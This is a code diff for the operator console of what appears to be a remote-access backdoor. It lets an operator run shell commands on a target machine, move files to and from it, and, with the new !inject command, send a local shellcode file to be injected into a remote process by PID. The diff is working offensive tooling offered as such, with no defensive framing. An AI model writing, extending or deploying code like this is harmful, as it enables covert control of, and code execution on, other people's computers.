@@ -170,6 +170,9 @@ BOOL serv_EXEC(IN SOCKET *s, IN const char *params)
     char            cmd[BUF_SZ];
     char            res[BUF_SZ];
 
+    if (!params || *params == 0)
+        return TRUE;
+
     memset(cmd, 0, sizeof(cmd));
 
     strcat(cmd, "!exec ");
@@ -195,6 +198,11 @@ BOOL serv_GET(IN SOCKET *s, IN const char *params)
     char            *modparams = NULL, *local_filename = NULL;
     FILE            *fp = NULL;
     unsigned long   nwrite;
+
+    if (!params || *params == 0) {
+        p_err("[-] Missing arguments to !get, check !help\n");
+        return TRUE;
+    }
 
     memset(cmd, 0, sizeof(cmd));
     memset(res, 0, sizeof(res));
@@ -262,6 +270,11 @@ BOOL serv_PUT(IN SOCKET *s, IN const char *params)
     char            *modparams = NULL, *remote_filename = NULL;
     FILE            *fp = NULL;
     unsigned long   nread;
+
+    if (!params || *params == 0) {
+        p_err("[-] Missing arguments to !put, check !help\n");
+        return TRUE;
+    }
 
     memset(cmd, 0, sizeof(cmd));
     memset(res, 0, sizeof(res));
@@ -331,8 +344,103 @@ BOOL serv_EXIT(IN SOCKET *s, IN const char *params)
     return FALSE;
 }
 
+BOOL serv_INJECT(IN SOCKET *s, IN const char *params)
+{
+    char            cmd[BUF_SZ];
+    char            res[BUF_SZ];
+    char            status[BUF_SZ];
+    char            logbuf[260];
+    char            filepath[128];
+    char            pid[8];
+    const char      *pos;
+    char            *tmp;
+    FILE            *fp = NULL;
+    unsigned long   ret, nread;
+
+    if (!params || *params == 0) {
+        p_err("[-] Missing arguments to !inject, check !help\n");
+        return TRUE;
+    }
+
+    memset(cmd, 0, sizeof(cmd));
+    memset(res, 0, sizeof(res));
+    memset(filepath, 0, sizeof(filepath));
+    memset(pid, 0, sizeof(pid));
+    memset(logbuf, 0, sizeof(logbuf));
+    
+    pos = to_next_space(params);
+    if (!pos) {
+        p_err("[-] Malformed arguments to !inject, check !help\n");
+        return TRUE;
+    }
+
+    strncpy(filepath, params, ((pos - params) > sizeof(filepath) ? sizeof(filepath) : (pos - params)));
+
+    pos = to_next_non_space(pos);
+    if (!pos) {
+        p_err("[-] Malformed arguments to !inject, check !help\n");
+        return TRUE;
+    }
+
+    strncpy(pid, pos, sizeof(pid));
+    ret = strtoul(pid, &tmp, 10);
+    if (ret == 0) {
+        p_err("[-] Malformed arguments to !inject, check !help\n");
+        p_err("[-] Also, injecting to process 0 won't work\n");
+        return TRUE;
+    }
+
+    strcat(cmd, "!inject ");
+    strcat(cmd, pid);
+
+    fp = fopen(filepath, "rb");
+    if (!fp) {
+        snprintf(logbuf, sizeof(logbuf), "[-] Error reading %s locally.\n", filepath);
+        p_err(logbuf);
+        p_status("[*] Remember not to put quotes around file path!\n");
+        return TRUE;
+    }
+
+    sendbuf(*s, encrypt(cmd));
+    recvbuf(*s, res);
+    decrypt(res);
+
+    if (strstr(res, STATUS_ERR) != NULL) {
+        memset(logbuf, 0, sizeof(logbuf));
+        snprintf(logbuf, sizeof(logbuf), "[-] Error obtaining handle to process with PID %s.\n", pid);
+        p_err(logbuf);
+        return TRUE;
+    }
+
+    memset(res, 0, sizeof(res));
+
+    nread = fread(res, sizeof(char), sizeof(res), fp);
+    while (nread == BUF_SZ) {
+        sendbuf(*s, encrypt(res));
+        memset(res, 0, sizeof(res));
+        nread = fread(res, sizeof(char), sizeof(res), fp);
+    }
+
+    strcpy(status, STATUS_END);
+    sendbuf(*s, encrypt(status));
+    nread = htonl(nread);
+    send(*s, (unsigned char *)&nread, 8, 0);
+    sendbuf(*s, encrypt(res));
+
+    if (fp)
+        fclose(fp);
+    p_success(STATUS_DONE);
+
+    return TRUE;
+}
+
 BOOL serv_LOCAL(IN SOCKET *s, IN const char *params)
 {
+    if (!params || *params == 0) {
+        p_err("[-] Missing arguments to !local, check !help\n");
+        return TRUE;
+    }
+
     system(params);
     p_success(STATUS_DONE);
     return TRUE;
@@ -346,6 +454,7 @@ BOOL serv_HELP(IN SOCKET *s, IN const char *params)
     puts("  -- run shell commands on target: !exec <command>");
     puts("  -- download file:                !get <target filename>");
     puts("  -- upload file:                  !put <local filename>");
+    puts("  -- inject shellcode:             !inject <local shellcode file> <remote process id>");
     puts("  -- exit shell:                   !exit");
     puts("  -- run shell commands locally:   !local <command>");
     puts("  -- view help:                    !help");
@@ -400,6 +509,32 @@ char *last_unixpath(IN char *s)
             pos = s+1;
         s++;
     }
+
+    return pos;
+}
+
+const char *to_next_space(IN const char *s)
+{
+    const char *pos = NULL;
+
+    while (*s != 0 && *s != ' ')
+        s++;
+
+    if (*s == ' ')
+        pos = s;
+
+    return pos;
+}
+
+const char *to_next_non_space(IN const char *s)
+{
+    const char *pos = NULL;
+
+    while (*s != 0 && *s == ' ')
+        s++;
+
+    if (*s != 0)
+        pos = s;
 
     return pos;
 }
